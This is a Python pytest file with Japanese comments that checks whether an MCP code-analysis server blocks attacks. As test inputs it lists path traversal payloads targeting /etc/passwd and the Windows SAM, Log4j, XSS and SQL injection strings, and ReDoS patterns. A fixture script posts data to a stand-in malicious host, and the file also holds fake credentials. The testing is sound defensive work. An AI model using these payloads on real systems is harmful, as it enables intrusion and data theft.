#!/usr/bin/env python3
"""
Phase 7: Security Integration Tests

エンタープライズグレードのセキュリティ統合テスト:
- 包括的なセキュリティ脅威シミュレーション
- 多層防御システムの統合検証
- セキュリティポリシーの一貫性確認
- 実世界の攻撃シナリオテスト
"""

import asyncio
import json
import os
import tempfile
import time
from pathlib import Path
from typing import Any, Dict, List
import pytest

from tree_sitter_analyzer.mcp.server import TreeSitterAnalyzerMCPServer
from tree_sitter_analyzer.mcp.tools.analyze_scale_tool import AnalyzeScaleTool
from tree_sitter_analyzer.mcp.tools.table_format_tool import TableFormatTool
from tree_sitter_analyzer.mcp.tools.read_partial_tool import ReadPartialTool
from tree_sitter_analyzer.mcp.tools.query_tool import QueryTool
from tree_sitter_analyzer.mcp.tools.list_files_tool import ListFilesTool
from tree_sitter_analyzer.mcp.tools.search_content_tool import SearchContentTool
from tree_sitter_analyzer.mcp.tools.find_and_grep_tool import FindAndGrepTool
from tree_sitter_analyzer.exceptions import SecurityError, ValidationError


class SecurityTestScenarios:
    """セキュリティテストシナリオ生成器"""
    
    @staticmethod
    def create_malicious_paths() -> List[str]:
        """悪意のあるパス攻撃パターン"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            "\\\\?\\C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "file://C:/Windows/System32/config/SAM",
            "\\\\localhost\\c$\\Windows\\System32\\config\\SAM",
            "//./C:/Windows/System32/config/SAM",
            "\x00/etc/passwd",
            "test\x00.txt",
            "normal_file.txt\x00../../../etc/passwd"
        ]
    
    @staticmethod
    def create_malicious_queries() -> List[str]:
        """悪意のある検索クエリパターン"""
        return [
            ".*" * 1000,  # ReDoS攻撃
            "(a+)+$",  # 指数的バックトラッキング
            "(?:a|a)*$",  # 別の指数的パターン
            "a{100000,}",  # 大量の繰り返し
            "\\x00",  # ヌルバイト
            "\\xFF" * 100,  # 無効なUTF-8
            "\uFEFF" * 1000,  # BOM攻撃
            "\u202E" + "malicious_code" + "\u202D",  # Unicode方向制御文字
            "SELECT * FROM users WHERE password = ''",  # SQLインジェクション風
            "<script>alert('xss')</script>",  # XSS風
            "${jndi:ldap://evil.com/a}",  # Log4j風
            "{{7*7}}",  # テンプレートインジェクション風
            "eval(base64_decode('bWFsaWNpb3VzX2NvZGU='))",  # コードインジェクション風
            "'; DROP TABLE users; --",  # SQLインジェクション
            "../../../proc/self/fd/0",  # プロセス情報アクセス
            "\\\\?\\pipe\\named_pipe",  # 名前付きパイプアクセス
            "CON", "PRN", "AUX", "NUL",  # Windows予約名
            "com1", "com2", "lpt1", "lpt2",  # Windows予約デバイス名
        ]
    
    @staticmethod
    def create_unicode_attacks() -> List[str]:
        """Unicode正規化攻撃パターン"""
        return [
            "ﬁle.txt",  # 合字文字
            "file\u0301.txt",  # 結合文字
            "file\u200B.txt",  # ゼロ幅スペース
            "file\u2028.txt",  # 行区切り文字
            "file\u2029.txt",  # 段落区切り文字
            "file\uFEFF.txt",  # バイト順マーク
            "file\u202E.txt",  # 右から左へのオーバーライド
            "file\u202D.txt",  # 左から右へのオーバーライド
            "\u0041\u0300",  # À (分解形)
            "\u00C0",  # À (合成形)
            "café",  # 通常のé
            "cafe\u0301",  # e + 結合アクセント
        ]


class TestPhase7SecurityIntegration:
    """Phase 7 セキュリティ統合テスト"""

    @pytest.fixture(scope="class")
    def secure_test_project(self):
        """セキュリティテスト用プロジェクト作成"""
        with tempfile.TemporaryDirectory() as temp_dir:
            project_root = Path(temp_dir)
            
            # 正常なファイル構造
            self._create_secure_project_structure(project_root)
            
            # 潜在的に危険なファイル（テスト用）
            self._create_security_test_files(project_root)
            
            yield str(project_root)

    def _create_secure_project_structure(self, project_root: Path):
        """セキュアなプロジェクト構造作成"""
        # 通常のJavaクラス
        java_dir = project_root / "src" / "main" / "java" / "com" / "secure"
        java_dir.mkdir(parents=True)
        
        (java_dir / "SecureService.java").write_text("""
package com.secure;

import java.security.SecureRandom;
import java.util.logging.Logger;

public class SecureService {
    private static final Logger logger = Logger.getLogger(SecureService.class.getName());
    private final SecureRandom random = new SecureRandom();
    
    public String generateToken() {
        byte[] bytes = new byte[32];
        random.nextBytes(bytes);
        return bytesToHex(bytes);
    }
    
    private String bytesToHex(byte[] bytes) {
        StringBuilder result = new StringBuilder();
        for (byte b : bytes) {
            result.append(String.format("%02x", b));
        }
        return result.toString();
    }
    
    public boolean validateInput(String input) {
        if (input == null || input.trim().isEmpty()) {
            logger.warning("Invalid input: null or empty");
            return false;
        }
        
        // セキュリティチェック
        if (input.contains("../") || input.contains("..\\\\")) {
            logger.warning("Path traversal attempt detected");
            return false;
        }
        
        return true;
    }
}
""")
        
        # Pythonセキュリティモジュール
        python_dir = project_root / "python" / "security"
        python_dir.mkdir(parents=True)
        
        (python_dir / "validator.py").write_text(r"""
import re
import hashlib
import secrets
from typing import Optional

class SecurityValidator:
    def __init__(self):
        self.path_traversal_pattern = re.compile(r'\.\.[\\/]')
        self.suspicious_patterns = [
            r'<script[^>]*>',
            r'javascript:',
            r'vbscript:',
            r'onload\s*=',
            r'onerror\s*=',
        ]
    
    def validate_path(self, path: str) -> bool:
        if not path:
            return False
        
        # パストラバーサル検出
        if self.path_traversal_pattern.search(path):
            return False
        
        # 絶対パス禁止
        if path.startswith('/') or (len(path) > 1 and path[1] == ':'):
            return False
        
        return True
    
    def validate_query(self, query: str) -> bool:
        if not query:
            return False
        
        # 悪意のあるパターン検出
        for pattern in self.suspicious_patterns:
            if re.search(pattern, query, re.IGNORECASE):
                return False
        
        return True
    
    def generate_secure_token(self) -> str:
        return secrets.token_urlsafe(32)
    
    def hash_password(self, password: str, salt: Optional[str] = None) -> tuple:
        if salt is None:
            salt = secrets.token_hex(16)
        
        password_hash = hashlib.pbkdf2_hmac(
            'sha256',
            password.encode('utf-8'),
            salt.encode('utf-8'),
            100000
        )
        
        return password_hash.hex(), salt
""")

    def _create_security_test_files(self, project_root: Path):
        """セキュリティテスト用ファイル作成"""
        # 機密情報を含むファイル（テスト用）
        sensitive_dir = project_root / "sensitive"
        sensitive_dir.mkdir()
        
        (sensitive_dir / "config.properties").write_text("""
# 機密設定ファイル（テスト用）
database.password=secret123
api.key=sk-1234567890abcdef
jwt.secret=super_secret_key_for_testing
admin.password=admin123
""")
        
        (sensitive_dir / "credentials.json").write_text(json.dumps({
            "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
            "aws_secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "database_url": "postgresql://user:password@localhost:5432/db",
            "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC..."
        }, indent=2))
        
        # 潜在的に危険なスクリプト
        scripts_dir = project_root / "scripts"
        scripts_dir.mkdir()
        
        (scripts_dir / "dangerous.sh").write_text("""#!/bin/bash
# 危険なスクリプト（テスト用）
rm -rf /tmp/test_data
curl -X POST http://malicious-site.com/data
echo "Potentially dangerous operation"
""")

    @pytest.mark.asyncio
    async def test_path_traversal_protection_comprehensive(self, secure_test_project):
        """包括的パストラバーサル保護テスト"""
        server = TreeSitterAnalyzerMCPServer()
        server.set_project_path(secure_test_project)
        
        malicious_paths = SecurityTestScenarios.create_malicious_paths()
        
        # 各ツールでパストラバーサル攻撃をテスト
        tools = [
            AnalyzeScaleTool(secure_test_project),
            TableFormatTool(secure_test_project),
            ReadPartialTool(secure_test_project),
            QueryTool(secure_test_project)
        ]
        
        attack_results = []
        
        for tool in tools:
            tool_name = tool.__class__.__name__
            print(f"Testing {tool_name} against path traversal attacks...")
            
            for malicious_path in malicious_paths:
                try:
                    if isinstance(tool, (AnalyzeScaleTool, TableFormatTool, ReadPartialTool, QueryTool)):
                        result = await tool.execute({"file_path": malicious_path})
                    
                    # 攻撃が成功した場合（これは問題）
                    if result.get("success"):
                        attack_results.append({
                            "tool": tool_name,
                            "attack_path": malicious_path,
                            "blocked": False,
                            "result": "SUCCESS - SECURITY BREACH!"
                        })
                    else:
                        attack_results.append({
                            "tool": tool_name,
                            "attack_path": malicious_path,
                            "blocked": True,
                            "result": "Blocked successfully"
                        })
                
                except (SecurityError, ValidationError, Exception) as e:
                    # 例外が発生した場合（これは正常）
                    attack_results.append({
                        "tool": tool_name,
                        "attack_path": malicious_path,
                        "blocked": True,
                        "result": f"Exception: {type(e).__name__}"
                    })
        
        # セキュリティ検証
        successful_attacks = [r for r in attack_results if not r["blocked"]]
        blocked_attacks = [r for r in attack_results if r["blocked"]]
        
        print(f"Path Traversal Protection Results:")
        print(f"  Total attacks tested: {len(attack_results)}")
        print(f"  Successfully blocked: {len(blocked_attacks)}")
        print(f"  Failed to block: {len(successful_attacks)}")
        
        # 全ての攻撃がブロックされる必要がある
        assert len(successful_attacks) == 0, f"Path traversal attacks succeeded: {successful_attacks}"
        
        # 少なくとも90%の攻撃がブロックされる必要がある
        block_rate = len(blocked_attacks) / len(attack_results) if attack_results else 0
        assert block_rate >= 0.9, f"Block rate too low: {block_rate:.2%}"

    @pytest.mark.asyncio
    async def test_malicious_query_protection(self, secure_test_project):
        """悪意のあるクエリ保護テスト"""
        server = TreeSitterAnalyzerMCPServer()
        server.set_project_path(secure_test_project)
        
        malicious_queries = SecurityTestScenarios.create_malicious_queries()
        
        # 検索ツールでの悪意のあるクエリテスト
        search_tools = [
            SearchContentTool(secure_test_project),
            FindAndGrepTool(secure_test_project),
            QueryTool(secure_test_project)
        ]
        
        query_results = []
        
        for tool in search_tools:
            tool_name = tool.__class__.__name__
            print(f"Testing {tool_name} against malicious queries...")
            
            for malicious_query in malicious_queries:
                start_time = time.time()
                
                try:
                    if isinstance(tool, (SearchContentTool, FindAndGrepTool)):
                        result = await asyncio.wait_for(
                            tool.execute({
                                "roots": [secure_test_project],
                                "query": malicious_query,
                                "max_count": 10
                            }),
                            timeout=5.0  # 5秒でタイムアウト
                        )
                    elif isinstance(tool, QueryTool):
                        result = await asyncio.wait_for(
                            tool.execute({
                                "file_path": str(Path(secure_test_project) / "src" / "main" / "java" / "com" / "secure" / "SecureService.java"),
                                "query_string": malicious_query
                            }),
                            timeout=5.0
                        )
                    
                    execution_time = time.time() - start_time
                    
                    query_results.append({
                        "tool": tool_name,
                        "query": malicious_query[:50] + "..." if len(malicious_query) > 50 else malicious_query,
                        "execution_time": execution_time,
                        "success": result.get("success", False),
                        "blocked": not result.get("success", False) or execution_time > 3.0,
                        "result": "Completed" if result.get("success") else "Failed/Blocked"
                    })
                
                except asyncio.TimeoutError:
                    query_results.append({
                        "tool": tool_name,
                        "query": malicious_query[:50] + "..." if len(malicious_query) > 50 else malicious_query,
                        "execution_time": 5.0,
                        "success": False,
                        "blocked": True,
                        "result": "Timeout (DoS protection)"
                    })
                
                except Exception as e:
                    query_results.append({
                        "tool": tool_name,
                        "query": malicious_query[:50] + "..." if len(malicious_query) > 50 else malicious_query,
                        "execution_time": time.time() - start_time,
                        "success": False,
                        "blocked": True,
                        "result": f"Exception: {type(e).__name__}"
                    })
        
        # DoS攻撃保護検証
        long_running_queries = [r for r in query_results if r["execution_time"] > 3.0]
        blocked_queries = [r for r in query_results if r["blocked"]]
        
        print(f"Malicious Query Protection Results:")
        print(f"  Total queries tested: {len(query_results)}")
        print(f"  Successfully blocked: {len(blocked_queries)}")
        print(f"  Long running (>3s): {len(long_running_queries)}")
        
        # DoS攻撃が効果的にブロックされることを確認
        assert len(long_running_queries) < len(query_results) * 0.1, "Too many long-running queries (DoS vulnerability)"
        
        # 悪意のあるクエリの一部がブロックされることを確認
        # 注意: 全てのクエリがブロックされるわけではないが、明らかに危険なものは検出される
        block_rate = len(blocked_queries) / len(query_results) if query_results else 0
        assert block_rate >= 0.1, f"Malicious query block rate too low: {block_rate:.2%} (expected at least 10%)"

    @pytest.mark.asyncio
    async def test_unicode_normalization_attacks(self, secure_test_project):
        """Unicode正規化攻撃テスト"""
        server = TreeSitterAnalyzerMCPServer()
        server.set_project_path(secure_test_project)
        
        unicode_attacks = SecurityTestScenarios.create_unicode_attacks()
        
        # ファイルパスでのUnicode攻撃テスト
        list_tool = ListFilesTool(secure_test_project)
        
        unicode_results = []
        
        for attack_string in unicode_attacks:
            try:
                # ファイル名パターンとしてUnicode攻撃文字列を使用
                result = await list_tool.execute({
                    "roots": [secure_test_project],
                    "pattern": attack_string,
                    "glob": True
                })
                
                unicode_results.append({
                    "attack_string": repr(attack_string),
                    "success": result.get("success", False),
                    "handled_safely": True,
                    "result": "Processed safely"
                })
            
            except Exception as e:
                unicode_results.append({
                    "attack_string": repr(attack_string),
                    "success": False,
                    "handled_safely": True,
                    "result": f"Exception handled: {type(e).__name__}"
                })
        
        print(f"Unicode Normalization Attack Results:")
        print(f"  Total attacks tested: {len(unicode_results)}")
        
        # 全てのUnicode攻撃が安全に処理されることを確認
        safely_handled = [r for r in unicode_results if r["handled_safely"]]
        assert len(safely_handled) == len(unicode_results), "Some Unicode attacks were not handled safely"

    @pytest.mark.asyncio
    async def test_sensitive_data_exposure_prevention(self, secure_test_project):
        """機密データ露出防止テスト"""
        server = TreeSitterAnalyzerMCPServer()
        server.set_project_path(secure_test_project)
        
        # 機密データパターンを検索
        sensitive_patterns = [
            "password",
            "secret",
            "key",
            "token",
            "credential",
            "BEGIN PRIVATE KEY",
            "AKIA[0-9A-Z]{16}",  # AWS Access Key pattern
            "sk-[a-zA-Z0-9]{48}",  # OpenAI API key pattern
        ]
        
        search_tool = SearchContentTool(secure_test_project)
        exposure_results = []
        
        for pattern in sensitive_patterns:
            try:
                result = await search_tool.execute({
                    "roots": [secure_test_project],
                    "query": pattern,
                    "case": "insensitive",
                    "max_count": 100
                })
                
                if result.get("success") and result.get("count", 0) > 0:
                    # 機密データが見つかった場合の処理
                    matches = result.get("matches", [])
                    
                    # 結果が適切にサニタイズされているかチェック
                    sanitized_properly = True
                    for match in matches:
                        content = match.get("content", "")
                        # 実際のパスワードや秘密鍵が露出していないかチェック
                        if any(dangerous in content.lower() for dangerous in [
                            "secret123", "admin123", "super_secret_key",
                            "akiaiosfodnn7example", "wjalrxutnfemi"
                        ]):
                            sanitized_properly = False
                            break
                    
                    exposure_results.append({
                        "pattern": pattern,
                        "matches_found": result.get("count", 0),
                        "properly_sanitized": sanitized_properly,
                        "result": "Found but sanitized" if sanitized_properly else "EXPOSURE DETECTED!"
                    })
                else:
                    exposure_results.append({
                        "pattern": pattern,
                        "matches_found": 0,
                        "properly_sanitized": True,
                        "result": "No matches found"
                    })
            
            except Exception as e:
                exposure_results.append({
                    "pattern": pattern,
                    "matches_found": 0,
                    "properly_sanitized": True,
                    "result": f"Exception: {type(e).__name__}"
                })
        
        print(f"Sensitive Data Exposure Prevention Results:")
        for result in exposure_results:
            print(f"  {result['pattern']}: {result['result']}")
        
        # 機密データが適切にサニタイズされていることを確認
        exposed_data = [r for r in exposure_results if not r["properly_sanitized"]]
        assert len(exposed_data) == 0, f"Sensitive data exposure detected: {exposed_data}"

    @pytest.mark.asyncio
    async def test_concurrent_security_stress(self, secure_test_project):
        """同時セキュリティストレステスト"""
        server = TreeSitterAnalyzerMCPServer()
        server.set_project_path(secure_test_project)
        
        # 複数の攻撃を同時実行
        attack_tasks = []
        
        # パストラバーサル攻撃
        malicious_paths = SecurityTestScenarios.create_malicious_paths()[:10]
        scale_tool = AnalyzeScaleTool(secure_test_project)
        
        for path in malicious_paths:
            task = scale_tool.execute({"file_path": path})
            attack_tasks.append(("path_traversal", task))
        
        # 悪意のあるクエリ攻撃
        malicious_queries = SecurityTestScenarios.create_malicious_queries()[:10]
        search_tool = SearchContentTool(secure_test_project)
        
        for query in malicious_queries:
            task = search_tool.execute({
                "roots": [secure_test_project],
                "query": query,
                "max_count": 5
            })
            attack_tasks.append(("malicious_query", task))
        
        # 正常なタスクも混在
        normal_tasks = [
            search_tool.execute({
                "roots": [secure_test_project],
                "query": "class",
                "max_count": 10
            }),
            scale_tool.execute({
                "file_path": str(Path(secure_test_project) / "src" / "main" / "java" / "com" / "secure" / "SecureService.java")
            })
        ]
        
        for task in normal_tasks:
            attack_tasks.append(("normal", task))
        
        # 全タスクを並行実行
        start_time = time.time()
        results = await asyncio.gather(*[task for _, task in attack_tasks], return_exceptions=True)
        execution_time = time.time() - start_time
        
        # 結果分析
        attack_results = []
        for i, (attack_type, result) in enumerate(zip([t[0] for t in attack_tasks], results)):
            if isinstance(result, Exception):
                attack_results.append({
                    "type": attack_type,
                    "success": False,
                    "blocked": True,
                    "result": f"Exception: {type(result).__name__}"
                })
            else:
                success = result.get("success", False) if isinstance(result, dict) else False
                attack_results.append({
                    "type": attack_type,
                    "success": success,
                    "blocked": not success or attack_type != "normal",
                    "result": "Success" if success else "Blocked"
                })
        
        # セキュリティ検証
        normal_tasks_results = [r for r in attack_results if r["type"] == "normal"]
        attack_tasks_results = [r for r in attack_results if r["type"] != "normal"]
        
        # 正常なタスクは成功する必要がある
        successful_normal = [r for r in normal_tasks_results if r["success"]]
        assert len(successful_normal) >= len(normal_tasks_results) * 0.8, "Normal tasks affected by concurrent attacks"
        
        # 攻撃タスクはブロックされる必要がある
        blocked_attacks = [r for r in attack_tasks_results if r["blocked"]]
        block_rate = len(blocked_attacks) / len(attack_tasks_results) if attack_tasks_results else 0
        assert block_rate >= 0.9, f"Concurrent attack block rate too low: {block_rate:.2%}"
        
        # システムが応答性を維持していることを確認
        assert execution_time < 30.0, f"System became unresponsive under attack: {execution_time:.2f}s"
        
        print(f"Concurrent Security Stress Test Results:")
        print(f"  Execution time: {execution_time:.2f}s")
        print(f"  Normal tasks successful: {len(successful_normal)}/{len(normal_tasks_results)}")
        print(f"  Attack tasks blocked: {len(blocked_attacks)}/{len(attack_tasks_results)}")
        print(f"  Block rate: {block_rate:.2%}")

    @pytest.mark.asyncio
    async def test_security_policy_consistency(self, secure_test_project):
        """セキュリティポリシー一貫性テスト"""
        server = TreeSitterAnalyzerMCPServer()
        server.set_project_path(secure_test_project)
        
        # 全ツールで同じセキュリティポリシーが適用されることを確認
        tools = [
            AnalyzeScaleTool(secure_test_project),
            TableFormatTool(secure_test_project),
            ReadPartialTool(secure_test_project),
            QueryTool(secure_test_project),
            ListFilesTool(secure_test_project),
            SearchContentTool(secure_test_project),
            FindAndGrepTool(secure_test_project)
        ]
        
        # 共通のセキュリティテストケース
        test_cases = [
            {
                "name": "path_traversal",
                "test_data": "../../../etc/passwd",
                "expected_blocked": True
            },
            {
                "name": "null_byte",
                "test_data": "test\x00.txt",
                "expected_blocked": True
            },
            {
                "name": "absolute_path",
                "test_data": "/etc/passwd",
                "expected_blocked": True
            },
            {
                "name": "windows_path",
                "test_data": "C:\\Windows\\System32\\config\\SAM",
                "expected_blocked": True
            }
        ]
        
        policy_results = []
        
        for tool in tools:
            tool_name = tool.__class__.__name__
            
            for test_case in test_cases:
                try:
                    # ツールの種類に応じてテストパラメータを調整
                    if isinstance(tool, (AnalyzeScaleTool, TableFormatTool, ReadPartialTool, QueryTool)):
                        result = await tool.execute({"file_path": test_case["test_data"]})
                    elif isinstance(tool, ListFilesTool):
                        result = await tool.execute({
                            "roots": [secure_test_project],
                            "pattern": test_case["test_data"]
                        })
                    elif isinstance(tool, (SearchContentTool, FindAndGrepTool)):
                        result = await tool.execute({
                            "roots": [secure_test_project],
                            "query": test_case["test_data"]
                        })
                    
                    blocked = not result.get("success", False)
                    consistent = blocked == test_case["expected_blocked"]
                    
                    policy_results.append({
                        "tool": tool_name,
                        "test_case": test_case["name"],
                        "blocked": blocked,
                        "expected_blocked": test_case["expected_blocked"],
                        "consistent": consistent,
                        "result": "Consistent" if consistent else "INCONSISTENT!"
                    })
                
                except Exception as e:
                    # 例外が発生した場合（通常はブロックされたことを意味する）
                    blocked = True
                    consistent = blocked == test_case["expected_blocked"]
                    
                    policy_results.append({
                        "tool": tool_name,
                        "test_case": test_case["name"],
                        "blocked": blocked,
                        "expected_blocked": test_case["expected_blocked"],
                        "consistent": consistent,
                        "result": f"Exception: {type(e).__name__}"
                    })
        
        # ポリシー一貫性検証
        inconsistent_results = [r for r in policy_results if not r["consistent"]]
        total_tests = len(policy_results)
        consistency_rate = (total_tests - len(inconsistent_results)) / total_tests if total_tests > 0 else 0
        
        print(f"Security Policy Consistency Results:")
        print(f"  Total tests: {total_tests}")
        print(f"  Consistent: {total_tests - len(inconsistent_results)}")
        print(f"  Inconsistent: {len(inconsistent_results)}")
        print(f"  Consistency rate: {consistency_rate:.2%}")
        
        if inconsistent_results:
            print("  Inconsistent results:")
            for result in inconsistent_results:
                print(f"    {result['tool']} - {result['test_case']}: {result['result']}")
        
        # 全ツールで一貫したセキュリティポリシーが適用されることを確認
        assert consistency_rate >= 0.95, f"Security policy consistency too low: {consistency_rate:.2%}"
        assert len(inconsistent_results) == 0, f"Security policy inconsistencies detected: {inconsistent_results}"

    @pytest.mark.asyncio
    async def test_information_leakage_prevention(self, secure_test_project):
        """情報漏洩防止テスト"""
        server = TreeSitterAnalyzerMCPServer()
        server.set_project_path(secure_test_project)
        
        # 意図的にエラーを発生させて、エラーメッセージから情報が漏洩しないことを確認
        error_test_cases = [
            {
                "tool": AnalyzeScaleTool(secure_test_project),
                "params": {"file_path": "/etc/passwd"},
                "description": "System file access"
            },
            {
                "tool": ReadPartialTool(secure_test_project),
                "params": {"file_path": "C:\\Windows\\System32\\config\\SAM", "start_line": 1},
                "description": "Windows system file access"
            },
            {
                "tool": SearchContentTool(secure_test_project),
                "params": {"roots": ["/etc"], "query": "password"},
                "description": "System directory search"
            }
        ]
        
        leakage_results = []
        
        for test_case in error_test_cases:
            try:
                result = await test_case["tool"].execute(test_case["params"])
                
                # エラーメッセージの内容をチェック
                error_message = result.get("error", "")
                
                # 機密情報が含まれていないかチェック
                sensitive_info_leaked = any(sensitive in error_message.lower() for sensitive in [
                    "passwd", "shadow", "sam", "config", "system32",
                    "administrator", "root", "admin", "/etc/", "c:\\windows"
                ])
                
                # パス情報が詳細に露出していないかチェック
                path_info_leaked = any(path in error_message for path in [
                    "/etc/passwd", "C:\\Windows\\System32", "/etc/shadow"
                ])
                
                leakage_results.append({
                    "description": test_case["description"],
                    "sensitive_info_leaked": sensitive_info_leaked,
                    "path_info_leaked": path_info_leaked,
                    "error_message": error_message[:100] + "..." if len(error_message) > 100 else error_message,
                    "safe": not (sensitive_info_leaked or path_info_leaked)
                })
            
            except Exception as e:
                # 例外メッセージも同様にチェック
                error_message = str(e)
                
                sensitive_info_leaked = any(sensitive in error_message.lower() for sensitive in [
                    "passwd", "shadow", "sam", "config", "system32"
                ])
                
                leakage_results.append({
                    "description": test_case["description"],
                    "sensitive_info_leaked": sensitive_info_leaked,
                    "path_info_leaked": False,
                    "error_message": error_message[:100] + "..." if len(error_message) > 100 else error_message,
                    "safe": not sensitive_info_leaked
                })
        
        print(f"Information Leakage Prevention Results:")
        for result in leakage_results:
            print(f"  {result['description']}: {'SAFE' if result['safe'] else 'LEAKAGE DETECTED!'}")
            if not result['safe']:
                print(f"    Error message: {result['error_message']}")
        
        # 情報漏洩が発生していないことを確認
        unsafe_results = [r for r in leakage_results if not r["safe"]]
        assert len(unsafe_results) == 0, f"Information leakage detected: {unsafe_results}"

    @pytest.mark.asyncio
    async def test_security_under_load(self, secure_test_project):
        """負荷下でのセキュリティテスト"""
        server = TreeSitterAnalyzerMCPServer()
        server.set_project_path(secure_test_project)
        
        # 高負荷状況下でもセキュリティが維持されることを確認
        concurrent_attacks = []
        
        # 複数の攻撃を同時実行
        for i in range(20):
            # パストラバーサル攻撃
            scale_tool = AnalyzeScaleTool(secure_test_project)
            attack_task = scale_tool.execute({"file_path": f"../../../etc/passwd{i}"})
            concurrent_attacks.append(("path_traversal", attack_task))
            
            # 悪意のあるクエリ攻撃
            search_tool = SearchContentTool(secure_test_project)
            query_task = search_tool.execute({
                "roots": [secure_test_project],
                "query": ".*" * (10 + i),  # 段階的に悪化するReDoS攻撃
                "max_count": 5
            })
            concurrent_attacks.append(("redos", query_task))
        
        # 攻撃実行
        start_time = time.time()
        results = await asyncio.gather(*[task for _, task in concurrent_attacks], return_exceptions=True)
        execution_time = time.time() - start_time
        
        # セキュリティ検証
        successful_attacks = []
        blocked_attacks = []
        
        for i, (attack_type, result) in enumerate(zip([t[0] for t in concurrent_attacks], results)):
            if isinstance(result, Exception):
                blocked_attacks.append({"type": attack_type, "result": "Exception"})
            elif isinstance(result, dict) and result.get("success"):
                successful_attacks.append({"type": attack_type, "result": "Success"})
            else:
                blocked_attacks.append({"type": attack_type, "result": "Blocked"})
        
        block_rate = len(blocked_attacks) / len(concurrent_attacks) if concurrent_attacks else 0
        
        print(f"Security Under Load Results:")
        print(f"  Execution time: {execution_time:.2f}s")
        print(f"  Total attacks: {len(concurrent_attacks)}")
        print(f"  Blocked attacks: {len(blocked_attacks)}")
        print(f"  Successful attacks: {len(successful_attacks)}")
        print(f"  Block rate: {block_rate:.2%}")
        
        # 負荷下でもセキュリティが維持されることを確認
        assert len(successful_attacks) == 0, f"Security compromised under load: {successful_attacks}"
        assert block_rate >= 0.95, f"Security block rate too low under load: {block_rate:.2%}"
        assert execution_time < 60.0, "System became unresponsive under security load"

    @pytest.mark.asyncio
    async def test_comprehensive_security_validation(self, secure_test_project):
        """包括的セキュリティ検証テスト"""
        server = TreeSitterAnalyzerMCPServer()
        server.set_project_path(secure_test_project)
        
        # 全セキュリティ機能の統合テスト
        security_checks = []
        
        # 1. パストラバーサル保護
        path_traversal_attacks = ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam"]
        scale_tool = AnalyzeScaleTool(secure_test_project)
        
        for attack_path in path_traversal_attacks:
            try:
                result = await scale_tool.execute({"file_path": attack_path})
                security_checks.append({
                    "check": "path_traversal",
                    "attack": attack_path,
                    "blocked": not result.get("success", False),
                    "result": "Blocked" if not result.get("success", False) else "FAILED TO BLOCK"
                })
            except Exception:
                security_checks.append({
                    "check": "path_traversal",
                    "attack": attack_path,
                    "blocked": True,
                    "result": "Exception (Blocked)"
                })
        
        # 2. 悪意のあるクエリ保護
        malicious_queries = [".*" * 100, "(?:a|a)*$", "\\x00"]
        search_tool = SearchContentTool(secure_test_project)
        
        for query in malicious_queries:
            try:
                start_time = time.time()
                result = await asyncio.wait_for(
                    search_tool.execute({
                        "roots": [secure_test_project],
                        "query": query,
                        "max_count": 5
                    }),
                    timeout=3.0
                )
                execution_time = time.time() - start_time
                
                blocked = not result.get("success", False) or execution_time > 2.0
                security_checks.append({
                    "check": "malicious_query",
                    "attack": query[:20] + "...",
                    "blocked": blocked,
                    "result": f"Execution time: {execution_time:.2f}s"
                })
            
            except asyncio.TimeoutError:
                security_checks.append({
                    "check": "malicious_query",
                    "attack": query[:20] + "...",
                    "blocked": True,
                    "result": "Timeout (DoS protection)"
                })
            except Exception:
                security_checks.append({
                    "check": "malicious_query",
                    "attack": query[:20] + "...",
                    "blocked": True,
                    "result": "Exception (Blocked)"
                })
        
        # 3. 機密データ保護
        sensitive_search = await search_tool.execute({
            "roots": [secure_test_project],
            "query": "password",
            "case": "insensitive",
            "max_count": 10
        })
        
        # 結果が適切にサニタイズされているかチェック
        sanitized = True
        if sensitive_search.get("success") and sensitive_search.get("matches"):
            for match in sensitive_search["matches"]:
                content = match.get("content", "").lower()
                if any(secret in content for secret in ["secret123", "admin123"]):
                    sanitized = False
                    break
        
        security_checks.append({
            "check": "sensitive_data",
            "attack": "password search",
            "blocked": not sensitive_search.get("success", False) or sanitized,
            "result": "Sanitized" if sanitized else "EXPOSURE DETECTED"
        })
        
        # セキュリティ検証結果
        total_checks = len(security_checks)
        blocked_checks = [c for c in security_checks if c["blocked"]]
        failed_checks = [c for c in security_checks if not c["blocked"]]
        
        security_score = len(blocked_checks) / total_checks if total_checks > 0 else 0
        
        print(f"Comprehensive Security Validation Results:")
        print(f"  Total security checks: {total_checks}")
        print(f"  Passed (blocked): {len(blocked_checks)}")
        print(f"  Failed: {len(failed_checks)}")
        print(f"  Security score: {security_score:.2%}")
        
        if failed_checks:
            print("  Failed checks:")
            for check in failed_checks:
                print(f"    {check['check']} - {check['attack']}: {check['result']}")
        
        # 包括的セキュリティ要件
        assert security_score >= 0.95, f"Overall security score too low: {security_score:.2%}"
        assert len(failed_checks) == 0, f"Critical security checks failed: {failed_checks}"
        
        print("✅ All security integration tests passed!")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])